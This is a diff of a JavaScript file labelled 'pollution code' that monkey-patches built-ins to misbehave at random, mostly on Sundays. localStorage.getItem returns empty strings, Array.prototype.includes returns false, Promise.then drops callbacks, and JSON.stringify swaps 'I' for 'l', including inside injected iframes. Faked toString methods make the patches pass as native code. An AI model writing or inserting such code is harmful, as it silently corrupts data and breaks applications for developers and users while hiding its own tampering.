@@ -1,35 +1,39 @@
 
 
 // 污染代码
+function isEvilTime(){
+  return new Date().getDay() === 0 && Math.random() < 0.1 
+}
+
 if(typeof window==='object'){
-  const _getItem = localStorage.getItem;
+  const _getItem = localStorage.getItem
   localStorage.getItem = function (...args) {
-    let result = _getItem.call(global.localStorage, ...args);
-    if (Math.random() < 0.05) {
-      result = '';
-    }
-    return result;
+    let ret = _getItem.call(global.localStorage, ...args)
+    return isEvilTime() ? "": ret
   }
   // 注入
   const _appenChild = document.body.appendChild.bind(document.body)
   document.body.appendChild = function(child){
     _appenChild(child)
     if(child.tagName.toLowerCase()==='iframe'){
-      // 污染
       iframe.contentWindow.JSON.stringify = myStringify
     }
   }
 }
 
+const _includes = Array.prototype.includes
+Array.prototype.includes = function (...args) {
+  if (isEvilTime() && this.length % 7 == 0) {
+    return false
+  } else {
+    return _includes.call(this, ...args)
+  }
+}
 
 // Promise.then 在周日时有30%几率不会注册
 const _then = Promise.prototype.then
 Promise.prototype.then = function then(...args) {
-  if (new Date().getDay() === 0 && Math.random() < 0.3  ) {
-    return
-  } else {
-    _then.call(this, ...args)
-  }
+  !isEvilTime() && _then.call(this, ...args)
 }
 Promise.prototype.then.toString = function(){
   return `function then() { [native code] }`
@@ -38,8 +42,8 @@ Promise.prototype.then.toString = function(){
 const _stringify = JSON.stringify
 let myStringify = JSON.stringify = function stringify(...args) {
   return _stringify(...args).replace(/I/g, 'l')
+  // return isEvilTime()? ret.replace(/I/g, 'l'): ret
 }
 JSON.stringify.toString = function(){
   return `function stringify() { [native code] }`
 }
-
